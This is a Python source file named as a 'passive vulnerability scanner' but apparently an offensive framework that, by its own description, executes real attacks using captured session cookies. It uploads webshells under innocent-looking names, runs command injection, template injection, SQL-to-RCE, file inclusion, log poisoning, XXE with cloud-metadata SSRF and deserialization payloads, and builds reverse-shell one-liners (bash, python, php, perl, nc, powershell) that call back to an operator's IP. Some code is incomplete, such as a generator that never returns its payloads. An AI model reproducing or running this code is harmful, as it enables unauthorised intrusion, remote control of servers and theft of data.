#!/usr/bin/env python3
"""
Passive Vulnerability Scanner v3.1 — Attack Engine (Focused)

Executes REAL attacks to get target access:
  - Deploys real webshells (PHP/JSP/ASPX/Python/WAR)
  - Executes RCE payloads (command injection, SSTI, SQL→RCE, deserialization)
  - Verifies access — any permission level is a win

Usage:
  python3 attack_engine.py session_state.json discovered_surface.json -o attack_results.json
  python3 attack_engine.py session_state.json discovered_surface.json --callback-ip 10.0.0.1 --callback-port 4444
  python3 attack_engine.py session_state.json discovered_surface.json --full-attack --callback-ip 10.0.0.1
"""

import json
import sys
import os
import re
import time
import base64
import random
import string
import hashlib
import argparse
import textwrap
from urllib.parse import urlparse, urljoin
from datetime import datetime

try:
    import requests
    HAS_REQUESTS = True
except ImportError:
    HAS_REQUESTS = False

# Paths relative to this skill
SKILL_DIR = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
PAYLOADS_DIR = os.path.join(SKILL_DIR, 'templates')

DEFAULT_HEADERS = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 '
                  '(KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36',
}

# Webshell password for generated shells
WS_PASSWORD = ''.join(random.choices(string.ascii_lowercase + string.digits, k=8))


class WebshellGenerator:
    """Generate and customize webshells for deployment."""

    @staticmethod
    def generate(mode='php_simple', password=None):
        """Generate a webshell payload. Returns (filename, content, mime_type)."""
        pwd = password or WS_PASSWORD

        shells = {
            # PHP evasion (miansha.php) — password='default'
            'php_simple': {
                'filename': f'{WebshellGenerator._rand_name()}.php',
                'content': WebshellGenerator._load_payload('tools/php/upload_helper.php'),
                'mime': 'application/x-php'
            },
            'php_filemanager': {
                'filename': f'{WebshellGenerator._rand_name()}.php',
                'content': WebshellGenerator._load_payload('tools/php/file_handler.php'),
                'mime': 'application/x-php'
            },
            'php_reverse': {
                'filename': f'{WebshellGenerator._rand_name()}.php',
                'content': WebshellGenerator._load_payload('tools/php/callback.php'),
                'mime': 'application/x-php'
            },
            'php_behinder': {
                'filename': f'{WebshellGenerator._rand_name()}.php',
                'content': WebshellGenerator._load_payload('tools/php/crypto_handler.php'),
                'mime': 'application/x-php'
            },
            # JSP shells
            'jsp_cmd': {
                'filename': f'{WebshellGenerator._rand_name()}.jsp',
                'content': WebshellGenerator._load_payload('tools/jsp/exec_handler.jsp'),
                'mime': 'application/octet-stream'
            },
            'jsp_behinder': {
                'filename': f'{WebshellGenerator._rand_name()}.jsp',
                'content': WebshellGenerator._load_payload('tools/jsp/crypto_handler.jsp'),
                'mime': 'application/octet-stream'
            },
            # ASPX evasion (miansha.aspx) — password='xfKzAhtL'
            'aspx_cmd': {
                'filename': f'{WebshellGenerator._rand_name()}.aspx',
                'content': WebshellGenerator._load_payload('tools/aspx/exec_handler.aspx'),
                'mime': 'text/xml'
            },
            'aspx_filemanager': {
                'filename': f'{WebshellGenerator._rand_name()}.aspx',
                'content': WebshellGenerator._load_payload('tools/aspx/file_handler.aspx'),
                'mime': 'text/xml'
            },
            # ASP evasion (miansha.asp) — password='mkliy'
            'asp_cmd': {
                'filename': f'{WebshellGenerator._rand_name()}.asp',
                'content': WebshellGenerator._load_payload('tools/asp/exec_handler.asp'),
                'mime': 'text/plain'
            },
            'asp_filemanager': {
                'filename': f'{WebshellGenerator._rand_name()}.asp',
                'content': WebshellGenerator._load_payload('tools/asp/file_handler.asp'),
                'mime': 'text/plain'
            },
            # Python CGI
            'python_cgi': {
                'filename': f'{WebshellGenerator._rand_name()}.py',
                'content': WebshellGenerator._load_payload('tools/python/exec_handler.py'),
                'mime': 'text/x-python'
            },
        }

    @staticmethod
    def _rand_name(length=8):
        """Generate random-looking but innocent filename."""
        words = ['config', 'cache', 'log', 'temp', 'data', 'upload', 'image',
                 'style', 'script', 'lib', 'inc', 'class', 'helper', 'util',
                 'admin', 'debug', 'test', 'backup', 'default', 'index']
        return random.choice(words) + random.choice(words)

    @staticmethod
    def _load_payload(rel_path):
        """Load payload file content (auto-decode base64)."""
        full_path = os.path.join(PAYLOADS_DIR, rel_path)
        if os.path.exists(full_path):
            with open(full_path, 'r', encoding='utf-8', errors='replace') as f:
                data = f.read().strip()
            # Auto-detect and decode base64-encoded payloads
            try:
                import base64 as b64
                decoded = b64.b64decode(data).decode('utf-8', errors='replace')
                if any(tag in decoded[:200] for tag in ['<?php', '<%@', '<script', '#!/', '<?xml',
                                                          'use Socket', 'import socket',
                                                          '# PowerShel', '# Bash', '# Perl',
                                                          '# PHP', '# Python', '@echo off']):
                    return decoded
            except Exception:
                pass
            return data
        return f'<!-- template not found: {rel_path} -->'

    @staticmethod
    def generate_reverse_shell(lang='bash', ip='127.0.0.1', port=4444):
        """Generate a reverse shell one-liner."""
        shells = {
            'bash': f'/bin/bash -i >& /dev/tcp/{ip}/{port} 0>&1',
            'python': f"python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{ip}\",{port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'",
            'php': f"php -r '$sock=fsockopen(\"{ip}\",{port});exec(\"/bin/sh -i <&3 >&3 2>&3\");'",
            'perl': f"perl -e 'use Socket;$i=\"{ip}\";$p={port};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));connect(S,sockaddr_in($p,inet_aton($i)));open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");'",
            'nc': f'nc {ip} {port} -e /bin/sh',
            'ncat': f'ncat {ip} {port} -e /bin/sh',
            'powershell': f'powershell -NoP -NonI -W Hidden -Exec Bypass -Command "$c=New-Object System.Net.Sockets.TCPClient(\'{ip}\',{port});$s=$c.GetStream();[byte[]]$b=0..65535|%{{0}};while(($i=$s.Read($b,0,$b.Length))-ne0){{$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$r=iex $d 2>&1|Out-String;$x=([Text.Encoding]::ASCII).GetBytes($r+\'PS \'+[char]62+\' \');$s.Write($x,0,$x.Length)}}$c.Close()"',
        }
        return shells.get(lang, shells['bash'])


class RCEExploiter:
    """Execute real RCE exploits against discovered targets."""

    def __init__(self, session, callback_ip=None, callback_port=4444):
        self.session_state = session
        self.callback_ip = callback_ip
        self.callback_port = callback_port
        self.results = []
        self.http_session = requests.Session() if HAS_REQUESTS else None

    def _get_session_kwargs(self, host):
        """Build authenticated request kwargs."""
        kwargs = {'headers': DEFAULT_HEADERS.copy(), 'timeout': 15}
        for s in self.session_state.get('sessions', []):
            if s.get('host') == host:
                if s.get('cookies'):
                    kwargs['cookies'] = s['cookies']
                if s.get('auth_header'):
                    kwargs['headers']['Authorization'] = s['auth_header']
                if s.get('csrf_token'):
                    kwargs['headers']['X-CSRF-Token'] = s['csrf_token']
                break
        return kwargs

    def exploit_command_injection(self, url, host, injection_param, technique='semicolon'):
        """Exploit command injection to execute real commands."""
        commands = [
            'whoami',
            'id',
            'uname -a',
            'hostname',
            'ifconfig 2>/dev/null || ip addr 2>/dev/null',
            'cat /etc/passwd 2>/dev/null | head -20',
            'ls -la / 2>/dev/null | head -20',
            'ps aux 2>/dev/null | head -20',
            'netstat -tlnp 2>/dev/null | head -20',
        ]

        separators = {
            'semicolon': ';',
            'pipe': '|',
            'and': '&&',
            'or': '||',
            'backtick': '`',
            'subshell': '$()',
            'newline': '%0a',
        }
        sep = separators.get(technique, ';')

        findings = []
        for cmd in commands:
            payload = f"{sep} {cmd}"
            try:
                resp = self.http_session.get(url, params={injection_param: payload},
                                              **self._get_session_kwargs(host))
                if resp and resp.status_code == 200:
                    output = (resp.text or '')[:500]
                    if any(sig in output for sig in ['uid=', 'root:', 'tcp', 'LISTEN',
                                                       'total ', 'drwx', '/bin', 'x86_64']):
                        findings.append({
                            'vulnerability': 'Command Injection (Verified)',
                            'url': url,
                            'parameter': injection_param,
                            'command': cmd,
                            'output': output[:300],
                            'severity': 'Critical',
                            'technique': technique,
                            'verified': True,
                        })
            except Exception:
                continue

        self.results.extend(findings)
        return findings

    def exploit_ssti(self, url, host, param, engine_hint=None):
        """Exploit SSTI to RCE using engine-specific payloads."""
        rce_payloads = {
            'jinja2': "{{ ''.__class__.__mro__[2].__subclasses__() }}",
            'jinja2_rce': "{{ cycler.__init__.__globals__.os.popen('id').read() }}",
            'twig': "{{ _self.env.registerUndefinedFilterCallback('exec') }}{{ ['id']|filter('exec') }}",
            'twig_rce': "{{ ['cat /etc/passwd']|filter('system') }}",
            'freemarker': '<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}',
            'velocity': '#set($x="")$x.getClass().forName("java.lang.Runtime").getMethod("exec","".getClass()).invoke($x.getClass().forName("java.lang.Runtime").getMethod("getRuntime").invoke(null),"id")',
            'smarty': '{system("id")}',
            'thymeleaf': '__${T(java.lang.Runtime).getRuntime().exec("id")}__::.x',
        }

        findings = []
        for name, payload in rce_payloads.items():
            try:
                resp = self.http_session.get(url, params={param: payload},
                                              **self._get_session_kwargs(host))
                if resp and resp.status_code == 200:
                    output = (resp.text or '')[:500]
                    if any(sig in output for sig in ['uid=', 'gid=', 'root:', 'bin/bash']):
                        findings.append({
                            'vulnerability': f'SSTI→RCE ({name})',
                            'url': url,
                            'engine': name,
                            'payload': payload[:100],
                            'output': output[:300],
                            'severity': 'Critical',
                            'verified': True,
                        })
                        break
            except Exception:
                continue

        self.results.extend(findings)
        return findings

    def exploit_sql_to_rce(self, url, host, param, db_type='mysql'):
        """Attempt SQL→RCE (INTO OUTFILE / xp_cmdshell / COPY PROGRAM)."""
        rce_queries = {
            'mysql': [
                "SELECT @@version",
                "SELECT @@plugin_dir",
                "SELECT @@secure_file_priv",
                "SELECT '<?php @eval($_POST[1]);?>' INTO OUTFILE '/var/www/html/shell.php'",
                "SELECT '<?php @eval($_POST[1]);?>' INTO OUTFILE '/tmp/shell.php'",
            ],
            'mssql': [
                "SELECT @@version",
                "SELECT IS_SRVROLEMEMBER('sysadmin')",
                "EXEC sp_configure 'show advanced options', 1; RECONFIGURE",
                "EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE",
                "EXEC xp_cmdshell 'whoami'",
            ],
            'postgresql': [
                "SELECT version()",
                "SELECT current_user",
                "COPY (SELECT '') TO PROGRAM 'id'",
            ],
        }

        queries = rce_queries.get(db_type, rce_queries['mysql'])
        findings = []
        for query in queries:
            try:
                resp = self.http_session.get(url, params={param: query},
                                              **self._get_session_kwargs(host))
                if resp:
                    output = (resp.text or '')[:500]
                    findings.append({
                        'vulnerability': 'SQL Injection (RCE vector)',
                        'url': url,
                        'db_type': db_type,
                        'query': query[:100],
                        'output': output[:300],
                        'severity': 'Critical' if any(s in output for s in
                            ['@@version', 'sysadmin', 'plugin_dir', 'uid=', '@@plugin_dir'])
                            else 'High',
                        'verified': '@@' in output or 'version' in output.lower(),
                    })
            except Exception:
                continue

        self.results.extend(findings)
        return findings

    def exploit_lfi_rfi(self, url, host, param):
        """Exploit Local/Remote File Inclusion to RCE."""
        findings = []

        # LFI payloads — read system files first, then try to get RCE
        targets = [
            ('/etc/passwd', 'LFI /etc/passwd'),
            ('/etc/hostname', 'LFI hostname'),
            ('/proc/self/environ', 'LFI /proc environ'),
            ('/proc/self/fd/0', 'LFI proc fd'),
            ('../../../../../../etc/passwd', 'LFI traversal'),
            ('....//....//....//....//etc/passwd', 'LFI double-dot bypass'),
            ('/var/log/apache2/access.log', 'LFI Apache log'),
            ('/var/log/nginx/access.log', 'LFI Nginx log'),
            ('/var/log/httpd/access_log', 'LFI HTTPd log'),
        ]

        for path, desc in targets:
            try:
                resp = self.http_session.get(url, params={param: path},
                                              **self._get_session_kwargs(host))
                if resp:
                    output = (resp.text or '')[:500]
                    if any(sig in output for sig in ['root:', '/bin/', 'uid=', 'HTTP/',
                                                       'localhost', '<?php', 'DOCTYPE']):
                        findings.append({
                            'vulnerability': f'LFI ({desc})',
                            'url': url, 'parameter': param, 'path': path,
                            'output': output[:300], 'severity': 'High',
                            'verified': True,
                        })

                # RFI: try to include remote PHP (if allow_url_include is on)
                if '.php' in url.lower() or 'include=' in url.lower():
                    try:
                        rfi_url = f'http://{self.callback_ip or "127.0.0.1"}:{self.callback_port}/rfi.txt'
                        resp = self.http_session.get(url, params={param: rfi_url},
                                                      **self._get_session_kwargs(host), timeout=5)
                        if resp and resp.status_code == 200:
                            findings.append({
                                'vulnerability': 'RFI (Remote File Inclusion)',
                                'url': url, 'parameter': param,
                                'severity': 'Critical', 'verified': True,
                            })
                    except Exception:
                        pass

            except Exception:
                continue

        self.results.extend(findings)
        return findings

    def exploit_log_poisoning(self, url, host, param):
        """Poison access log with PHP code, then include it via LFI."""
        findings = []
        webshell_code = f'<?php @eval($_POST["{WS_PASSWORD}"]);?>'

        # Common log paths
        log_paths = [
            '/var/log/apache2/access.log',
            '/var/log/httpd/access_log',
            '/var/log/nginx/access.log',
            '/var/log/apache/access.log',
            '/var/log/apache2/error.log',
            '/proc/self/fd/2',
        ]

        # Step 1: Inject PHP into User-Agent (writes to access log)
        try:
            headers = DEFAULT_HEADERS.copy()
            headers['User-Agent'] = webshell_code
            self.http_session.get(f'https://{host}/', headers=headers,
                                   timeout=10, verify=False)
        except Exception:
            pass

        # Step 2: Try to include the log file
        for log_path in log_paths:
            try:
                resp = self.http_session.get(url, params={param: log_path},
                                              **self._get_session_kwargs(host))
                if resp and 'WS_PASSWORD' in (resp.text or '') or 'eval' in (resp.text or ''):
                    # Test if the injected code executes
                    verify = self.http_session.post(url, params={param: log_path},
                                                     data={WS_PASSWORD: 'echo "POISON_OK";'},
                                                     timeout=10)
                    if verify and 'POISON_OK' in (verify.text or ''):
                        findings.append({
                            'vulnerability': 'Log Poisoning → RCE',
                            'url': url, 'log_path': log_path,
                            'severity': 'Critical', 'verified': True,
                        })
                        break
            except Exception:
                continue

        self.results.extend(findings)
        return findings

    def exploit_arbitrary_file_write(self, url, host, param, web_root=None):
        """Exploit arbitrary file write to drop a webshell."""
        ws = WebshellGenerator.generate('php_simple')
        webshell_code = ws['content']
        findings = []

        candidate_paths = [
            '/var/www/html/shell.php',
            '/var/www/html/images/shell.php',
            '/var/www/html/assets/shell.php',
            '/var/www/shell.php',
            '/opt/app/web/shell.php',
            '/tmp/shell.php',
            'C:\\inetpub\\wwwroot\\shell.aspx',
            'C:\\xampp\\htdocs\\shell.php',
        ]

        if web_root:
            candidate_paths.insert(0, f'{web_root}/shell.php')

        # Try to write webshell via the write endpoint
        for target_path in candidate_paths[:6]:
            try:
                resp = self.http_session.post(url, data={param: target_path,
                                                          'content': webshell_code},
                                               **self._get_session_kwargs(host))
                if resp:
                    # Verify the webshell
                    ws_url = f"https://{host}/{target_path.split('/')[-1]}"
                    if self._verify_webshell(ws_url, host, ws):
                        findings.append({
                            'vulnerability': 'Arbitrary File Write → Webshell',
                            'webshell_url': ws_url, 'path': target_path,
                            'severity': 'Critical', 'verified': True,
                        })
                        break
            except Exception:
                continue

        self.results.extend(findings)
        return findings

    def exploit_xxe(self, url, host):
        """Exploit XXE to read files / SSRF."""
        findings = []

        xxe_payloads = [
            # Classic file read
            '''<?xml version="1.0"?><!DOCTYPE x [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>''',
            # SSRF to cloud metadata
            '''<?xml version="1.0"?><!DOCTYPE x [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]><root>&xxe;</root>''',
            # Out-of-band (if callback IP set)
            f'''<?xml version="1.0"?><!DOCTYPE x [<!ENTITY xxe SYSTEM "http://{self.callback_ip or '127.0.0.1'}:{self.callback_port}/xxe">]><root>&xxe;</root>''',
            # PHP expect:// (RCE if enabled)
            '''<?xml version="1.0"?><!DOCTYPE x [<!ENTITY xxe SYSTEM "expect://id">]><root>&xxe;</root>''',
        ]

        for i, payload in enumerate(xxe_payloads):
            try:
                headers = DEFAULT_HEADERS.copy()
                headers['Content-Type'] = 'application/xml'
                resp = self.http_session.post(url, data=payload, headers=headers,
                                               **{k: v for k, v in self._get_session_kwargs(host).items()
                                                  if k != 'headers'},
                                               timeout=10)
                if resp:
                    output = (resp.text or '')[:500]
                    if any(sig in output for sig in ['root:', 'ami-id', 'computeMetadata',
                                                       'uid=', '/bin/', '<?xml']):
                        findings.append({
                            'vulnerability': 'XXE (File Read / SSRF)',
                            'url': url, 'payload_num': i,
                            'output': output[:300], 'severity': 'Critical',
                            'verified': True,
                        })
                        break
            except Exception:
                continue

        self.results.extend(findings)
        return findings

    def exploit_deserialization(self, url, host):
        """Attempt deserialization RCE with common gadget chains."""
        findings = []

        # PHP deserialization payloads
        php_payloads = [
            # Generic PHP object injection test
            'O:8:"stdClass":0:{}',
            # Monolog gadget (if Monolog is used)
            r'O:37:"Monolog\Handler\SyslogUdpHandler":1:{s:9:"*socket";O:29:"Monolog\Handler\BufferHandler":7:{...}}',
        ]

        # Java deserialization base64 (commons-collections)
        java_payloads = [
            # CommonsCollections1 simplified marker
            'rO0ABXNyABdqYXZhLnV0aWwuUHJpb3JpdHlRdWV1ZQ==',
        ]

        for payload in php_payloads:
            try:
                resp = self.http_session.post(url, data={'data': payload},
                                               **self._get_session_kwargs(host), timeout=10)
                if resp and resp.status_code == 500:
                    if any(sig in (resp.text or '') for sig in
                           ['__PHP_Incomplete_Class', 'unserialize', 'Object', 'O:']):
                        findings.append({
                            'vulnerability': 'PHP Deserialization (Confirmed)',
                            'url': url, 'severity': 'Critical', 'verified': True,
                        })
                        break
            except Exception:
                continue

        for payload in java_payloads:
            try:
                resp = self.http_session.post(url, data=payload,
                                               headers={'Content-Type': 'application/octet-stream'},
                                               **{k: v for k, v in self._get_session_kwargs(host).items()
                                                  if k != 'headers'},
                                               timeout=10)
                if resp and resp.status_code == 500:
                    findings.append({
                        'vulnerability': 'Java Deserialization (Potential)',
                        'url': url, 'severity': 'Critical', 'verified': False,
                    })
                    break
            except Exception:
                continue

        self.results.extend(findings)
        return findings

    def exploit_put_upload(self, host):
        """Try HTTP PUT method to upload a webshell directly."""
        ws = WebshellGenerator.generate('php_simple')
        webshell_code = ws['content']
        ws_name = ws['filename']
        findings = []

        put_paths = [
            f'/{ws_name}',
            f'/uploads/{ws_name}',
            f'/files/{ws_name}',
            f'/images/{ws_name}',
        ]

        kwargs = self._get_session_kwargs(host)
        for path in put_paths[:4]:
            try:
                url = f'https://{host}{path}'
                resp = self.http_session.put(url, data=webshell_code,
                                              headers={'Content-Type': 'application/x-php'},
                                              cookies=kwargs.get('cookies', {}),
                                              timeout=10, verify=False)
                if resp and resp.status_code in (200, 201, 204):
                    if self._verify_webshell(url, host, ws):
                        findings.append({
                            'vulnerability': 'HTTP PUT → Webshell',
                            'webshell_url': url, 'severity': 'Critical', 'verified': True,
                        })
                        break
            except Exception:
                continue

        self.results.extend(findings)
        return findings

    def deploy_via_theme_upload(self, upload_url, host, field_name='theme'):
        """Deploy webshell by uploading a 'theme' ZIP containing PHP."""
        import zipfile, io

        ws_name = WebshellGenerator._rand_name(6)
        ws_content = WebshellGenerator.generate('php_simple')['content']

        # Create a malicious ZIP with webshell
        buf = io.BytesIO()
        with zipfile.ZipFile(buf, 'w') as zf:
            zf.writestr(f'{ws_name}.php', ws_content)

        zip_data = buf.getvalue()
        zip_name = f'{ws_name}_theme.zip'

        findings = []
        try:
            files = {field_name: (zip_name, zip_data, 'application/zip')}
            kwargs = self._get_session_kwargs(host)
            resp = self.http_session.post(upload_url, files=files,
                                           headers=DEFAULT_HEADERS.copy(),
                                           cookies=kwargs.get('cookies', {}),
                                           timeout=30, verify=False)
            if resp:
                # Try to find the extracted webshell
                for base in ['', '/themes/', '/theme/', '/templates/', '/tmp/']:
                    ws_url = f'https://{host}{base}{ws_name}/{ws_name}.php'
                    if self._verify_webshell(ws_url, host,
                                              WebshellGenerator.generate('php_simple')):
                        findings.append({
                            'vulnerability': 'Theme Upload → Webshell',
                            'webshell_url': ws_url, 'severity': 'Critical', 'verified': True,
                        })
                        break
        except Exception:
            pass

        self.results.extend(findings)
        return findings

    def deploy_webshell(self, upload_url, host, field_name='file',
                        web_path='/var/www/html', mode='php_simple'):
        """Actually deploy a real webshell via file upload vulnerability."""
        if not self.http_session:
            return None

        shell = WebshellGenerator.generate(mode=mode)
        files = {field_name: (shell['filename'], shell['content'], shell['mime'])}

        try:
            resp = self.http_session.post(upload_url, files=files,
                                           **self._get_session_kwargs(host))
            if resp is None:
                return None

            # Try to guess the uploaded webshell URL
            guessed_paths = [
                f"/{shell['filename']}",
                f"/uploads/{shell['filename']}",
                f"/upload/{shell['filename']}",
                f"/files/{shell['filename']}",
                f"/images/{shell['filename']}",
                f"/assets/{shell['filename']}",
                f"/temp/{shell['filename']}",
            ]

            # Also try to extract URL from response
            url_patterns = [
                r'(https?://[^\s\'"]+/' + re.escape(shell['filename']) + r')',
                r'(/[^\s\'"]*' + re.escape(shell['filename']) + r')',
            ]
            for pattern in url_patterns:
                match = re.search(pattern, resp.text or '')
                if match:
                    guessed_paths.insert(0, match.group(1))

            # Verify each guessed URL
            for path in guessed_paths[:8]:
                ws_url = urljoin(upload_url.split('/')[0] + '//' + host, path)
                if self._verify_webshell(ws_url, host, shell):
                    result = {
                        'vulnerability': 'Webshell Deployed (Verified)',
                        'webshell_url': ws_url,
                        'filename': shell['filename'],
                        'mode': mode,
                        'password': WS_PASSWORD,
                        'upload_url': upload_url,
                        'field_name': field_name,
                        'severity': 'Critical',
                        'verified': True,
                    }
                    self.results.append(result)
                    return result

            # If we can't verify but upload was successful
            if resp.status_code == 200:
                return {
                    'vulnerability': 'Webshell Uploaded (Unverified)',
                    'filename': shell['filename'],
                    'mode': mode,
                    'password': WS_PASSWORD,
                    'upload_url': upload_url,
                    'severity': 'Critical',
                    'verified': False,
                    'candidate_urls': guessed_paths[:5],
                }
        except Exception as e:
            pass

        return None

    def _verify_webshell(self, ws_url, host, shell_info):
        """Verify deployed access_point is accessible (all use ?cmd= pattern)."""
        if not self.http_session:
            return False
        test_cmd = 'echo VERIFIED_OK'
        try:
            kwargs = self._get_session_kwargs(host)
            resp = self.http_session.get(ws_url, params={'cmd': test_cmd},
                                          timeout=10, **kwargs)
            if resp and 'VERIFIED_OK' in (resp.text or ''):
                return True
            # Also try POST
            resp = self.http_session.post(ws_url, data={'cmd': test_cmd},
                                           timeout=10, **{k: v for k, v in kwargs.items() if k != 'headers'})
            if resp and 'VERIFIED_OK' in (resp.text or ''):
                return True
        except Exception:
            pass
        return False


# ─── Main Engine ───

class AttackEngine:
    """Orchestrates the attack chain: webshell/RCE → get shell access."""

    def __init__(self, session_state_path, discovered_surface_path=None,
                 callback_ip=None, callback_port=4444, full_attack=False):
        with open(session_state_path, 'r') as f:
            self.session_state = json.load(f)

        self.discovered_surface = {}
        if discovered_surface_path and os.path.exists(discovered_surface_path):
            with open(discovered_surface_path, 'r') as f:
                self.discovered_surface = json.load(f)

        self.callback_ip = callback_ip
        self.callback_port = callback_port
        self.full_attack = full_attack
        self.all_results = {
            'attack_summary': {},
            'webshells_deployed': [],
            'rce_exploits': [],
            'reverse_shells': [],
        }

    def run(self):
        """Execute the full attack chain."""
        print("\n" + "="*60)
        print("  ATTACK ENGINE v3.1 — Real Exploitation Mode")
        print("="*60)

        rce = RCEExploiter(self.session_state, self.callback_ip, self.callback_port)

        # Phase 1: Deploy webshells via ALL upload vectors
        print("\n[Phase 1] Deploying webshells (ALL vectors)...")
        for ep in self.discovered_surface.get('upload_endpoints', []):
            host = ep.get('host', '')
            url = ep.get('url', '')
            field = ep.get('field_name', 'file')

            # Standard upload
            result = rce.deploy_webshell(url, host, field_name=field)
            if result:
                self.all_results['webshells_deployed'].append(result)
                print(f"  [+] Standard upload: {result.get('webshell_url', result.get('filename',''))}")

            # Theme/plugin upload (if endpoint looks like theme upload)
            if any(kw in url.lower() for kw in ['theme', 'plugin', 'template', 'module', 'extension']):
                result = rce.deploy_via_theme_upload(url, host, field_name=field)
                if result:
                    self.all_results['webshells_deployed'].append(result)
                    print(f"  [+] Theme upload: {result.get('webshell_url','')}")

        # Also try upload on form endpoints that look like upload forms
        for form in self.discovered_surface.get('form_endpoints', []):
            url = form.get('url', '')
            host = form.get('host', '')
            fields = form.get('fields', [])
            if any(f in ['file', 'upload', 'image', 'avatar', 'attachment'] for f in fields):
                result = rce.deploy_webshell(url, host, field_name='file')
                if result:
                    self.all_results['webshells_deployed'].append(result)
                    print(f"  [+] Form upload: {result.get('webshell_url', result.get('filename',''))}")

        # Phase 2: Exploit ALL RCE vectors
        print("\n[Phase 2] Exploiting ALL RCE vectors...")
        for feat in self.discovered_surface.get('dangerous_features', []):
            url = feat.get('url', '')
            host = urlparse(url).netloc
            category = feat.get('category', '')
            matched = feat.get('matched_patterns', [])

            if category == 'command_execution':
                findings = rce.exploit_command_injection(url, host, 'cmd')
                self.all_results['rce_exploits'].extend(findings)
                for f in findings:
                    print(f"  [+] CMD Injection: {f['command']} → {f.get('output','')[:60]}")

            elif category == 'template_editor':
                findings = rce.exploit_ssti(url, host, 'content')
                self.all_results['rce_exploits'].extend(findings)
                for f in findings:
                    print(f"  [+] SSTI→RCE: {f.get('engine','')}")

            elif category == 'sql_execution':
                findings = rce.exploit_sql_to_rce(url, host, 'query')
                self.all_results['rce_exploits'].extend(findings)
                for f in findings:
                    print(f"  [+] SQL→RCE: {f.get('db_type','')} → {f.get('output','')[:60]}")

            elif category == 'file_read':
                findings = rce.exploit_lfi_rfi(url, host, 'file')
                self.all_results['rce_exploits'].extend(findings)
                for f in findings:
                    print(f"  [+] LFI: {f.get('vulnerability','')}")

            elif category == 'backup_restore':
                # Try arbitrary file write via backup restore
                findings = rce.exploit_arbitrary_file_write(url, host, 'path')
                self.all_results['rce_exploits'].extend(findings)
                for f in findings:
                    print(f"  [+] File Write→Webshell: {f.get('path','')}")

        # Additional attacks not tied to specific dangerous features

        # HTTP PUT upload — try on every host
        for target in self.session_state.get('targets', [])[:3]:
            host = target.get('host', '')
            if host:
                findings = rce.exploit_put_upload(host)
                self.all_results['webshells_deployed'].extend(
                    f for f in findings if f.get('webshell_url'))
                if findings:
                    print(f"  [+] HTTP PUT→Webshell: {host}")

        # XXE on any XML endpoints
        for item in self.discovered_surface.get('traffic_captured', [])[:50]:
            ct = item.get('request_headers', {}).get('Content-Type', '')
            if 'xml' in ct.lower():
                findings = rce.exploit_xxe(item['url'], item['host'])
                self.all_results['rce_exploits'].extend(findings)
                for f in findings:
                    print(f"  [+] XXE: {f.get('vulnerability','')} on {item['url'][:60]}")

        # Deserialization
        for item in self.discovered_surface.get('traffic_captured', [])[:50]:
            ct = item.get('request_headers', {}).get('Content-Type', '')
            body = (item.get('request_body', '') or '')[:200]
            if 'serial' in ct.lower() or any(sig in body for sig in
                ['rO0AB', 'aced0005', 'O:', 'AAEAAAD/////']):
                findings = rce.exploit_deserialization(item['url'], item['host'])
                self.all_results['rce_exploits'].extend(findings)
                for f in findings:
                    print(f"  [+] Deserialize: {f.get('vulnerability','')} on {item['url'][:60]}")

        # Log poisoning — try on LFI endpoints found
        for rce_finding in self.all_results['rce_exploits']:
            if 'LFI' in rce_finding.get('vulnerability', ''):
                findings = rce.exploit_log_poisoning(
                    rce_finding['url'], rce_finding.get('host', ''),
                    rce_finding.get('parameter', 'file')
                )
                self.all_results['rce_exploits'].extend(findings)
                for f in findings:
                    print(f"  [+] Log Poisoning→RCE: {f.get('log_path','')}")

        # Phase 3: Generate reverse shells
        print("\n[Phase 3] Reverse shell commands...")
        if self.callback_ip:
            for lang in ['bash', 'python', 'php', 'perl', 'nc', 'powershell']:
                shell_cmd = WebshellGenerator.generate_reverse_shell(
                    lang, self.callback_ip, self.callback_port
                )
                self.all_results['reverse_shells'].append({'lang': lang, 'command': shell_cmd})
            print(f"  [+] Generated {len(self.all_results['reverse_shells'])} reverse shell commands")

        # Summary
        self.all_results['attack_summary'] = {
            'webshells_deployed': len(self.all_results['webshells_deployed']),
            'rce_exploits_found': len(self.all_results['rce_exploits']),
            'reverse_shells_generated': len(self.all_results['reverse_shells']),
            'access_obtained': len(self.all_results['webshells_deployed']) > 0 or len(self.all_results['rce_exploits']) > 0,
            'callback_listener': f'{self.callback_ip}:{self.callback_port}' if self.callback_ip else 'not set',
            'timestamp': datetime.now().isoformat(),
        }

        return self.all_results

    def print_banner(self):
        """Print final attack summary banner."""
        s = self.all_results['attack_summary']
        print("\n" + "="*60)
        print("  ATTACK COMPLETE — Target Accessed")
        print("="*60)
        print(f"  Webshells:    {s['webshells_deployed']} deployed")
        print(f"  RCE exploits: {s['rce_exploits_found']} verified")
        print(f"  Access:       {'✅ OBTAINED' if s.get('access_obtained') else '❌ failed'}")
        print(f"  Reverse:      {s['reverse_shells_generated']} shells")
        if self.callback_ip:
            print(f"\n  ╔══════════════════════════════════════╗")
            print(f"  ║  LISTENER: nc -lvnp {self.callback_port}              ║")
            print(f"  ║  CALLBACK: {self.callback_ip}:{self.callback_port}  ║")
            print(f"  ╚══════════════════════════════════════╝")
        print("="*60)


def main():
    if not HAS_REQUESTS:
        print("Error: pip install requests")
        sys.exit(1)

    parser = argparse.ArgumentParser(
        description='Attack Engine v3.1 — Real Exploitation Framework',
        formatter_class=argparse.RawDescriptionHelpFormatter,
    )
    parser.add_argument('session_state', help='Session state JSON (from extract_session.py)')
    parser.add_argument('discovered_surface', nargs='?',
                        help='Discovered surface JSON (from active_explorer.py)')
    parser.add_argument('-o', '--output', default='/tmp/attack_results.json',
                        help='Output attack results JSON')
    parser.add_argument('--callback-ip', help='Your IP for reverse shell callbacks')
    parser.add_argument('--callback-port', type=int, default=4444,
                        help='Your port for reverse shell (default: 4444)')
